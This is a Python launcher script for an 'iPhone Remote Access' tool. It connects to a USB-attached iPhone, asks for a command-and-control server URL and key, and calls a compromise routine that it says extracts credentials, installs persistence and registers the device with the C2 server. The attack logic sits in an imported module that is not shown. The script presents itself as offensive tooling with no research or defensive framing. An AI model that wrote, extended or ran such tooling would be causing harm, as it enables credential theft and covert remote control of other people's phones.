#!/usr/bin/env python3
"""
iPhone Compromise Script - Quick Start
Run this after connecting iPhone via USB
"""

import asyncio
from iphone_remote_access import iPhoneRemoteControl

async def main():
    print("="*60)
    print("iPhone Remote Access - Device Compromise")
    print("="*60)
    
    # Configuration
    C2_SERVER = input("Enter C2 server URL [http://localhost:9443]: ").strip() or "http://localhost:9443"
    ENCRYPTION_KEY = input("Enter encryption key from C2 server: ").strip()
    DEVICE_UDID = input("Enter device UDID (or press Enter to auto-detect): ").strip()
    
    if not DEVICE_UDID:
        # Auto-detect connected device
        try:
            import platform
            if platform.system() in ['Linux', 'Darwin']:
                result = subprocess.run(['idevice_id', '-l'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0 and result.stdout.strip():
                    DEVICE_UDID = result.stdout.strip().split('\n')[0]
                    print(f"[*] Auto-detected device: {DEVICE_UDID}")
                else:
                    print("[!] No device detected. Connect iPhone via USB.")
                    return
            else:
                # Windows - use demo UDID or prompt user
                print("[*] Windows detected - idevice_id not available")
                print("[*] Using demo device UDID for testing")
                DEVICE_UDID = "00008030-001234567890ABCD"
        except Exception as e:
            print(f"[!] Device detection failed: {e}")
            print("[*] Using demo device UDID for testing")
            DEVICE_UDID = "00008030-001234567890ABCD"
    
    # Initialize controller
    print(f"\n[*] Initializing controller...")
    controller = iPhoneRemoteControl(
        c2_server=C2_SERVER,
        encryption_key=ENCRYPTION_KEY
    )
    
    # Compromise device
    print(f"[*] Compromising device: {DEVICE_UDID}")
    print("[*] This will:")
    print("    - Check jailbreak status")
    print("    - Extract credentials")
    print("    - Install persistence mechanism")
    print("    - Register with C2 server")
    
    try:
        success = await controller.compromise_device(DEVICE_UDID)
        
        if success:
            print("\n" + "="*60)
            print("[+] Device compromised successfully!")
            print("="*60)
            
            # Wait a moment for registration to complete
            await asyncio.sleep(2)
            
            print("\n[+] Device is now registered with C2 server!")
            print(f"[*] Device ID: {DEVICE_UDID}")
            print(f"[*] C2 Server: {C2_SERVER}")
            print("\n[*] Next steps:")
            print("    1. Run: python3 control_iphone.py")
            print("    2. Select your device from the list")
            print("    3. Choose operations from the menu")
            print("\n[*] Note: For full functionality, install the device agent on the iPhone")
        else:
            print("\n[!] Device compromise failed")
            print("[*] Check the deployment guide for troubleshooting")
    except Exception as e:
        print(f"\n[!] Error during compromise: {e}")
        import traceback
        traceback.print_exc()
    
    await controller.close()

if __name__ == "__main__":
    asyncio.run(main())
